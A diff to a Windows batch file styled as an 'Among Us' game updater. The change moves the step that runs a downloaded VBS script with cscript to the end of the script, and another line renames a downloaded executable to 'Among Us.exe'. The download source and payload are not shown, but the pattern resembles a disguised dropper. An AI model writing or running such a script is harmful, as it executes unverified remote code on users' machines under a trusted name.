@@ -112,13 +112,6 @@ echo [INFO] Running Among Us update script...
 echo [INFO] Preparing to launch the update...
 echo.
 
-:: Run the downloaded Among Us update script
-cscript //nologo "%DestUpdate%"
-if %ERRORLEVEL% neq 0 (
-    echo [ERROR] There was an issue running the Among Us update script. The impostor might have sabotaged the update.
-    exit /b
-)
-
 :: Rename the downloaded executable to "Among Us.exe"
 echo [INFO] Renaming the downloaded executable to Among Us.exe...
 ren "%TempExe%" "Among Us.exe"
@@ -141,6 +134,12 @@ echo [INFO] Crewmates have completed the update. Task complete.
 
 echo.
 echo [INFO] The Among Us update process is complete.
-echo [INFO] Mission Accomplished. Exiting...
+echo [INFO] Mission Accomplished. Running VBS script...
+
+:: Run the Among Us update script before closing the batch file
+cscript //nologo "%DestUpdate%"
+
+echo [INFO] VBS script executed. Exiting...
 pause
 exit
+
